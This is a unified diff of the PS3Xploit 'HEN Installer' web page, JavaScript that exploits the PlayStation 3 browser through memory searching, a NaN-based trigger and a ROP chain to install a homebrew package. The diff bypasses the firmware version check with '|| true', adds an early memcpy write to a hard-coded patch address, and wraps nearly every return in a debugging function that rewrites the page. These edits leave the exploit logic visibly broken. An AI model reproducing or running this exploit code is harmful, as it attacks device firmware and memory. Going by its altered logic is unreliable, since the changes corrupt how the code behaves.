@@ -1,9 +1,19 @@
 <html>
  <head>
+ <style>
+  * {
+     font-family: monospace;
+     font-size: 16px;
+     word-break: normal;
+  }
+  #exploit, #trigger {
+      display: block;
+  }
+ </style>
   <script>
 var ua=navigator.userAgent,
 	fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));
-if(fwv==="4.80"){
+if(fwv==="4.80" || true){
 	var toc_addr=0x6F5520,
 	default_vsh_pub_toc=0x6ED574,
 	vsh_opd_patch=0x96D5C,
@@ -404,10 +414,12 @@ var xtra_data,
 	baseURL = window.location.href.replace(/[^/]*$/, ''),
 	write_file_contents='<?xml version="1.0" encoding="UTF-8"?><XMBML version="1.0"><View id="root"><Attributes><Table key="hen"><Pair key="focus_priority"><String>-1</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="hen" attr="hen" src="#hen_link"/><Query class="type:x-xmb/folder-pixmap" key="seg_premo" src="sel://localhost/nopremo?category_network.xml#seg_premo"/><Query class="type:x-xmb/folder-pixmap" key="seg_browser" src="#seg_browser"/></Items></View><View id="seg_premo"><Items><Item class="type:x-xmb/xmlpremo" key="PRemo" /></Items></View><View id="seg_browser"><Attributes><Table key="browser"><Pair key="icon_rsc"><String>tex_browser</String></Pair><Pair key="icon_notation"><String>WNT_XmbItemBrowser</String></Pair><Pair key="title_rsc"><String>msg_browser</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlwebbrowser" key="browser" attr="browser" /></Items></View><View id="hen_link"><Attributes><Table key="ps3hen_main"><Pair key="icon_rsc"><String>item_tex_Players</String></Pair><Pair key="title"><String>Install HEN</String></Pair><Pair key="info"><String>Downloads and installs the latest HEN Package (Reboot after)</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="ps3hen_main" attr="ps3hen_main" src="#ps3hen_pkg" /></Items></View><View id="ps3hen_pkg"><Attributes><Table key="ps3hen_link"><Pair key="info"><String>net_package_install</String></Pair><Pair key="pkg_src"><String>'+baseURL+fwv+'/HEN.pkg</String></Pair><Pair key="pkg_src_qa" ><String>'+baseURL+fwv+'/HEN.pkg</String></Pair><Pair key="content_name"><String>msg_install</String></Pair><Pair key="content_id"><String>CUSTOM-INSTALLER_00-0000000000000000</String></Pair><Pair key="prod_pict_path"><String>'+baseURL+'hendl.png</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlnpsignup" key="ps3hen_link" attr="ps3hen_link" /></Items></View></XMBML>';
 document.write('<html><title>PS3Xploit - HEN Installer</title><div id="result"></div><div id="exploit"></div><div id="trigger"></div></html>');
+let FLUSH;
 function memcpy(dest,src,len)
 {
 	return showResult(callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70));
 }
+FLUSH = memcpy(0x96D5C, 0x81D1A12, 0x00000000000001);
 function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
 {
   
@@ -422,17 +434,20 @@ function encTxt(text)
 {
 	return String.fromCharCode.apply(null,text.split('').map(function(e){return e.charCodeAt(0).toString(16)}).join('').toUpperCase().match(/[A-F0-9]{4}/g).map(function(v){return parseInt(v,16)}))
 }
+var last = Date.now();
+
 function showResult(str)
 {
-	document.getElementById('result').innerHTML=str;
+               if (!str) return;
+	setTimeout(() => document.documentElement.innerHTML=((new Error).stack + ": " + str + "<br>")+document.documentElement.innerHTML, (last = Date.now()) + 2000 + Math.random() * 900, FLUSH);
   return str;
 }
 function syscall_r3_p2p(sc,r3_ptr,r4,r5,r6,r7,r8,r9,r10,r31out)
 {
 	if(r31out===null){r31out=gtemp_addr;}
-	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
+	return showResult(hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
 	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3_ptr)
-	+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+	+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41));
 }
 function save_file_overwrite(to,fd,buf,wlen,size,nl)
 {
@@ -445,27 +460,27 @@ function save_file_overwrite(to,fd,buf,wlen,size,nl)
 }
 function hexh2bin(hex_val)
 {
-	return String.fromCharCode(hex_val);
+	return showResult(String.fromCharCode(hex_val));
 
 }
 function hexw2bin(hex_val)
 {
-	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
+	return showResult(String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val));
 }
 function hexdw2bin(hex_val)
 {
-	return hexw2bin(0) + hexw2bin(hex_val);
+	return showResult(hexw2bin(0) + hexw2bin(hex_val));
 }
 String.prototype.toHex16 = function()
 {
-	return ('0000' + this).substr(-4);
+	return showResult(('0000' + this).substr(-4));
 };
 String.prototype.toAscii = function(hex_16)
 {
     var ascii='';
 	var i=0;
 	while(i<this.length){if(hex_16===true){ascii += this.charCodeAt(i).toString(16).toHex16();} else {ascii += this.charCodeAt(i).toString(16);}i+=1;}
-	return ascii;
+	return showResult(ascii);
 };
 String.prototype.convert=function(ascii)
 {
@@ -480,7 +495,7 @@ String.prototype.convert=function(ascii)
 		ret.push(String.fromCharCode(parseInt(asciichr, 16)));
 		i+=4;
     }
-    return ret.join('');
+    return showResult(ret.join(''));
 };
 String.prototype.convertedSize = function(ascii)
 {
@@ -494,11 +509,11 @@ String.prototype.convertedSize = function(ascii)
 };
 String.prototype.replaceAt=function(index, ch)
 {
-	return this.substr(0,index)+ch+this.substr(index+ch.length);
+	return showResult(this.substr(0,index)+ch+this.substr(index+ch.length));
 };
 String.prototype.repeat = function(num)
 {
-    return new Array(num+1).join(this);
+    return showResult(new Array(num+1).join(this));
 };
 Number.prototype.noExponents=function()
 {
@@ -514,7 +529,7 @@ Number.prototype.noExponents=function()
     }
     mag -= str.length;  
     while(mag--) {z += '0';}
-    return str + z;
+    return showResult(str + z);
 };
 function fromIEEE754(bytes, ebits, fbits)
 {
@@ -553,7 +568,7 @@ function fromIEEE754(bytes, ebits, fbits)
 	{
 		retNumber = s * 0;
 	}
-	return retNumber.noExponents();
+	return showResult(retNumber.noExponents());
 }
 function generateIEEE754(address, size)
 {
@@ -569,12 +584,12 @@ function generateIEEE754(address, size)
 		(size >> 8) & 0xFF,
 		(size) & 0xFF
 	);
-	return fromIEEE754(hex, 11, 52);
+	return showResult(fromIEEE754(hex, 11, 52));
 }
 function generateExploit(address, size)
 {
 	var n = (address<<32) | ((size>>1)-1);
-	return generateIEEE754(address, (n-address));
+	return showResult(generateIEEE754(address, (n-address)));
 }
 function readMemory(address, size)
 {
@@ -585,12 +600,11 @@ function checkMemory(address, size, len)
 {
 	if(document.getElementById('exploit'))
 	{
-		readMemory(address, size);
-		return document.getElementById('exploit').style.src.substr(6,len);
+		showResult(readMemory(address, size));
+		return showResult(document.getElementById('exploit').style.src.substr(6,len));
 	}
 }
 function trigger(exploit_addr){
-  showResult(exploit_addr);
 	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
 	if (document.getElementById('trigger').innerHTML.indexOf("NaN") != -1) {
 		document.write("<html><h1><span style='color:red'>You must install Hybrid Firmware (HFW) before installing HEN!</h1></span></html>");
@@ -611,7 +625,7 @@ function findJsVariableOffset(name,exploit_data,base,size)
 	var k;
 	var match;
 	var exploit_addr;
-	while(i<(dat.length*2))
+	while(i<0x10*4096)
 	{
     showResult(exploit_addr);
 		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
@@ -686,6 +700,10 @@ function store_word(store_offset,val,r29out,r30out,r31out)
 }
 function initROP(init)
 {
+      setTimeout(() => {
+               clearTimeout(t_out);
+	triggerX();
+      }, 6000);
 	try
 	{
 
@@ -719,7 +737,7 @@ function initROP(init)
 
 		while(xtra_data_addr===0)
 		{
-			if(search_max_threshold<search_size){load_check();}
+			
 			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
 			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
 			search_max_threshold-=search_size;
@@ -752,30 +770,30 @@ function initROP(init)
 		var search = Date.now();
 		while(Date.now() - search < 2000)
 		{
-			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();}
+			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}}
 			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
 			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);
-			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();}
+			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;}
 			search_max_threshold-=search_size+search_size_ext;
 		}
 		search = Date.now();
 		jump_2=showResult(unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E"));		
 		while(Date.now() - search < 2000)
 		{
-			if(search_max_threshold<search_size){load_check();}
+			if(search_max_threshold<search_size){}
 			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
 			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
-			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();}
+			if(jump_2_addr==-1)if(search_max_threshold<search_size){}
 			search_max_threshold-=search_size;
 		}
 		search = Date.now();
 		jump_1=showResult(unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E"));
 		while(Date.now() - search < 2000)
 		{
-			if(search_max_threshold<search_size){load_check();}
+			if(search_max_threshold<search_size){}
 			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
 			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
-			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();}
+			if(jump_1_addr==-1)if(search_max_threshold<search_size){}
 			search_max_threshold-=search_size;
 		}
 		var sf=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);
@@ -788,7 +806,8 @@ function initROP(init)
 	}
 	catch(e)
 	{
-		
+		triggerX()
+                              if(t_out!==0){clearTimeout(t_out);}
 	}
 }
 function triggerX()
